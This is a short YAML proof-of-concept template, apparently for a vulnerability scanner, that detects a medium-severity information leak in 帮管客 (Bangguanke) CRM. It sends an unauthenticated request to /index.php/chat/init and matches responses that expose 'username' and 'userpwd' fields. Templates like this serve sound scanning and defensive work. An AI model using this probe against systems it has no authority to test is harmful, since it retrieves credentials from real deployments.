id: poc-yaml-bang-guan-ke-crm-information-leak
info:
  name: 帮管客 CRM 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: 帮管客 CRM
requests:
- method: GET
  path: /index.php/chat/init
  expression: status_code == 302 && contains(body,"\"username\"") && contains(body,"\"userpwd\"")
    && !contains(body,"<")
variables: {}
transport: http
